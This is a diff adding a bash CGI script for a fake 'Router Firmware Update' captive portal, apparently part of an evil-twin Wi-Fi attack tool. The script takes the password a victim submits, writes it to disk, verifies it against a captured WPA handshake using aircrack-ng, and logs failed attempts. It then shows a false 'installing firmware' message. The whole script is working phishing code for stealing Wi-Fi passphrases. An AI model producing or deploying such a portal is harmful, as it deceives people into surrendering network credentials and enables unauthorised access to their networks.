@@ -1,0 +1,60 @@
+#!/usr/bin/env bash
+
+echo '<!DOCTYPE html>'
+echo '<html>'
+echo -e '\t<head>'
+echo -e '\t\t<meta name="viewport" content="width=device-width, initial-scale=1"/>'
+echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
+echo -e '\t\t<title>Router Firmware Update</title>'
+echo -e '\t\t<link rel="stylesheet" type="text/css" href="portal.css"/>'
+echo -e '\t\t<script type="text/javascript" src="portal.js"></script>'
+echo -e '\t</head>'
+echo -e '\t<body>'
+echo -e '\t\t<div class="content">'
+echo -e '\t\t\t<div class="router-icon">'
+echo -e '\t\t\t\t<svg viewBox="0 0 24 24" width="48" height="48"><path fill="currentColor" d="M4 7h16a1 1 0 0 1 1 1v3a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V8a1 1 0 0 1 1-1zm2 3.5a1 1 0 1 0 0-2 1 1 0 0 0 0 2zm4 0a1 1 0 1 0 0-2 1 1 0 0 0 0 2zM3 15h18v2a1 1 0 0 1-1 1h-2l-1 2H7l-1-2H4a1 1 0 0 1-1-1v-2z"/></svg>'
+echo -e '\t\t\t</div>'
+echo -e '\t\t\t<div class="title"><center><p>'
+
+POST_DATA=$(cat /dev/stdin)
+if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ "${CONTENT_LENGTH}" -gt 0 ]]; then
+POST_DATA=${POST_DATA#*=}
+password=${POST_DATA//+/ }
+password=${password//[*&\/?<>]}
+password=$(printf '%b' "${password//%/\\x}")
+password=${password//[*&\/?<>]}
+fi
+
+if [[ "${#password}" -ge 8 ]] && [[ "${#password}" -le 63 ]]; then
+rm -rf "${tmpdir}${webdir}ag.et_currentpass.txt" > /dev/null 2>&1
+echo "${password}" > "${tmpdir}${webdir}ag.et_currentpass.txt"
+if aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}ag.et_currentpass.txt" "${et_handshake}" | grep "KEY FOUND!" > /dev/null; then
+touch "${tmpdir}${webdir}ag.et_success.txt" > /dev/null 2>&1
+echo '<span id="et-result" data-status="success">Credentials verified. Installing firmware update, your router will restart automatically once complete.</span>'
+et_successful=1
+else
+echo "${password}" >> "${tmpdir}${webdir}ag.et_attempts.txt"
+echo '<span id="et-result" data-status="fail">We could not verify that password against this network. Redirecting you back to try again.</span>'
+et_successful=0
+fi
+elif [[ "${#password}" -gt 0 ]] && [[ "${#password}" -lt 8 ]]; then
+echo '<span id="et-result" data-status="fail">Error. The password must be at least 8 characters. Redirecting to the main screen.</span>'
+et_successful=0
+else
+echo '<span id="et-result" data-status="fail">An unexpected error occurred. Redirecting to the main screen.</span>'
+et_successful=0
+fi
+
+echo -e '\t\t\t</p></center></div>'
+echo -e '\t\t</div>'
+echo -e '\t</body>'
+echo '</html>'
+
+if [ "${et_successful}" -eq 1 ]; then
+exit 0
+else
+echo '<script type="text/javascript">'
+echo -e '\tsetTimeout("redirect()", 3500);'
+echo '</script>'
+exit 1
+fi
